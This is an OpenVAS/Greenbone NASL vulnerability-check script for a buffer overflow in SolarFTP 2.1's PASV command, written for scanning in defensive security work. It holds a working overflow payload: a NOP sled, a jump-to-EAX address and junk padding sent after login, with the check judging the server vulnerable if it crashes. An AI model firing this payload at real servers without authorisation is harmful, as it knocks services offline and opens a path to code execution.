# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103024");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-01-11 12:59:27 +0100 (Tue, 11 Jan 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("SolarFTP 'PASV' Command Remote Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/solarftp/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45748");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code within
  the context of the affected application. Failed exploit attempts will
  result in a denial-of-service condition.");

  script_tag(name:"affected", value:"SolarFTP 2.1 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"SolarFTP is prone to a buffer-overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);
banner = ftp_get_banner(port:port);
if(! banner || "Solar FTP Server" >!< banner)
  exit(0);

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "Solar FTP Server" >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(port);
if(!soc1){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{
  jmp_eax  = crap(data:raw_string(0xBF,0x66,0x02,0x10),length:4*249);
  junk     = raw_string(0xCC,0xCC,0xCC,0xCC);
  nop_sled = crap(data:raw_string(0x90,0x90,0x90,0x90,0x90,0x90,0x90),length:2*7);
  junk2    = crap(data:"A",length:7004);
  bad_stuff = junk + nop_sled + jmp_eax + junk2;

  send(socket:soc1,data:string("PASV ", bad_stuff,"\r\n"));
  ftp_close(socket:soc1);
  sleep(2);

  soc = open_sock_tcp(port);
  if(!soc || !ftp_recv_line(socket:soc)) {
    if(soc)
      close(soc);
    security_message(port:port);
    exit(0);
  }
  close(soc);
  exit(0);
}

exit(0);
